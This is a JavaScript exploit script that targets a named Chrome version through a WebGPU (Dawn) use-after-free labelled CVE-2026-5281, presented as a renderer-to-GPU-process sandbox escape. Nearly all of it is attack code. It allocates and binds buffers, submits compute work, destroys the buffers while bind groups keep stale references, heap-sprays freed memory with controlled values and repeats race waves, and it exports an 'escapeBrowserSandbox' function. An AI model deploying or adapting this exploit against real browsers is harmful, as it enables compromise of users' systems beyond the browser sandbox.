// CVE-2026-5281: Dawn WebGPU Use-After-Free — Browser Sandbox Escape
// Bug 491518608 — variant of CVE-2026-4676 (bug 488613135)
// Target: Chrome 146.0.7680.165 (VULNERABLE, fixed in 146.0.7680.177/178)
//
// Impact: Renderer process (UNTRUSTED IL) → GPU process (MEDIUM IL)
// Prerequisite: Arbitrary code execution in renderer (V8 RCE + V8 SBX bypass)
// CISA KEV: Yes (April 2026), exploited in-the-wild
//
// Root cause:
//   CVE-2026-4676 fix added buffer reference counting for queue submissions.
//   CVE-2026-5281 BYPASSES this fix: bind groups retain stale Dawn-internal
//   references to buffer objects after buffer.destroy(). When the GPU process
//   executes pending commands that access bind group resources, it dereferences
//   the freed buffer → classic UAF.
//
// Architecture:
//   JS (WebGPU API) → Dawn Wire Client (renderer) → IPC → Dawn Wire Server
//   (GPU process) → Dawn Native → D3D12/Metal/Vulkan → GPU Hardware
//
//   The UAF occurs in Dawn Native code running in the GPU process.
//   The GPU process has a LESS restrictive sandbox than the renderer.

"use strict";

async function initWebGPU() {
    if (!navigator.gpu) {
        console.log("[Dawn] WebGPU not available");
        return null;
    }

    const adapter = await navigator.gpu.requestAdapter({
        powerPreference: "high-performance"
    });
    if (!adapter) {
        console.log("[Dawn] No GPU adapter");
        return null;
    }

    const device = await adapter.requestDevice({
        requiredLimits: {
            maxBufferSize: adapter.limits.maxBufferSize,
            maxStorageBufferBindingSize: adapter.limits.maxStorageBufferBindingSize,
        }
    });
    if (!device) {
        console.log("[Dawn] Failed to get GPU device");
        return null;
    }

    console.log("[Dawn] WebGPU device acquired");
    return { adapter, device };
}

function createComputePipeline(device) {
    const shaderModule = device.createShaderModule({
        code: `
            @group(0) @binding(0) var<storage, read_write> data: array<u32>;
            @compute @workgroup_size(256)
            fn main(@builtin(global_invocation_id) gid: vec3<u32>) {
                let idx = gid.x % arrayLength(&data);
                for (var i = 0u; i < 2000u; i = i + 1u) {
                    data[idx] = data[idx] ^ (data[idx] << 5u) ^ (i * gid.x);
                }
            }
        `
    });

    return device.createComputePipeline({
        layout: "auto",
        compute: { module: shaderModule, entryPoint: "main" }
    });
}

// Phase 1: Allocate target buffers with controlled content
function allocateTargetBuffers(device, count, size) {
    const buffers = [];
    for (let i = 0; i < count; i++) {
        const buf = device.createBuffer({
            size: size,
            usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC,
            mappedAtCreation: true,
        });
        const mapped = new Uint32Array(buf.getMappedRange());
        for (let j = 0; j < mapped.length; j++) {
            mapped[j] = (0xDA000000 | i) ^ (j * 0x1337);
        }
        buf.unmap();
        buffers.push(buf);
    }
    return buffers;
}

// Phase 2: Create bind groups — these hold Dawn-internal references to buffers
function createBindGroups(device, pipeline, buffers) {
    const layout = pipeline.getBindGroupLayout(0);
    return buffers.map(buf =>
        device.createBindGroup({
            layout: layout,
            entries: [{ binding: 0, resource: { buffer: buf } }]
        })
    );
}

// Phase 3: Submit heavy compute work via bind groups
function submitComputeBatches(device, pipeline, bindGroups, batchCount) {
    for (let batch = 0; batch < batchCount; batch++) {
        const encoder = device.createCommandEncoder();
        for (const bg of bindGroups) {
            try {
                const pass = encoder.beginComputePass();
                pass.setPipeline(pipeline);
                pass.setBindGroup(0, bg);
                pass.dispatchWorkgroups(8192);
                pass.end();
            } catch (e) { /* some may fail, continue */ }
        }
        device.queue.submit([encoder.finish()]);
    }
}

// Phase 4: Destroy buffers — bind groups retain stale references
function destroyBuffers(buffers) {
    for (let i = buffers.length - 1; i >= 0; i--) {
        buffers[i].destroy();
    }
}

// Phase 5: Heap spray — reclaim freed Dawn objects with controlled data
function heapSpray(device, count, size, payload) {
    const sprayBuffers = [];
    const data = new Uint32Array(size / 4);
    data.fill(payload);

    for (let i = 0; i < count; i++) {
        try {
            const buf = device.createBuffer({
                size: size,
                usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
            });
            device.queue.writeBuffer(buf, 0, data);
            sprayBuffers.push(buf);
        } catch (e) { break; }
    }
    return sprayBuffers;
}

// Full Dawn UAF exploitation sequence
async function escapeBrowserSandbox() {
    console.log("[Dawn] CVE-2026-5281: Dawn WebGPU UAF sandbox escape");
    console.log("[Dawn] Bug 491518608 — bypasses CVE-2026-4676 fix");
    console.log("[Dawn] Target: Chrome 146.0.7680.165 (vuln, fixed .177/.178)");

    const gpu = await initWebGPU();
    if (!gpu) return { success: false, error: "WebGPU unavailable" };

    let deviceLost = false;
    let lostReason = "";
    gpu.device.lost.then(info => {
        deviceLost = true;
        lostReason = info.reason + ": " + info.message;
        console.log("[Dawn] GPU DEVICE LOST: " + lostReason);
    });

    const pipeline = createComputePipeline(gpu.device);

    const BUF_SIZE = 16384;
    const BUF_COUNT = 200;
    const BATCH_COUNT = 48;

    // --- Main UAF cycle ---
    console.log("[Dawn] Phase 1: Allocating " + BUF_COUNT + " target buffers...");
    const buffers = allocateTargetBuffers(gpu.device, BUF_COUNT, BUF_SIZE);

    console.log("[Dawn] Phase 2: Creating bind groups (stale refs)...");
    const bindGroups = createBindGroups(gpu.device, pipeline, buffers);

    console.log("[Dawn] Phase 3: Submitting " + BATCH_COUNT + " compute batches...");
    submitComputeBatches(gpu.device, pipeline, bindGroups, BATCH_COUNT);

    console.log("[Dawn] Phase 4: Destroying buffers (bind groups retain stale refs)...");
    destroyBuffers(buffers);

    console.log("[Dawn] Phase 5: Heap spraying freed objects...");
    const spray1 = heapSpray(gpu.device, BUF_COUNT, BUF_SIZE, 0x42424242);

    console.log("[Dawn] Phase 6: Waiting for GPU stale command execution...");
    try {
        await gpu.device.queue.onSubmittedWorkDone();
    } catch (e) {
        console.log("[Dawn] GPU error (expected): " + e.message);
    }

    // --- Additional race waves ---
    if (!deviceLost) {
        for (let wave = 0; wave < 3 && !deviceLost; wave++) {
            console.log("[Dawn] Wave " + (wave + 1) + ": Additional race cycle...");
            const waveBufs = allocateTargetBuffers(gpu.device, 64, BUF_SIZE);
            if (waveBufs.length === 0) break;

            const waveBGs = createBindGroups(gpu.device, pipeline, waveBufs);
            submitComputeBatches(gpu.device, pipeline, waveBGs, 16);
            destroyBuffers(waveBufs);
            heapSpray(gpu.device, 32, BUF_SIZE, 0x43434343 + wave);

            try {
                await gpu.device.queue.onSubmittedWorkDone();
            } catch (e) {}
        }
    }

    const result = {
        success: true,
        deviceLost: deviceLost,
        lostReason: lostReason,
        note: deviceLost
            ? "GPU device lost — UAF triggered in GPU process"
            : "Submitted — check GPU process state",
    };

    console.log("[Dawn] Result: " + JSON.stringify(result));
    return result;
}

if (typeof module !== "undefined") {
    module.exports = { escapeBrowserSandbox, initWebGPU };
}
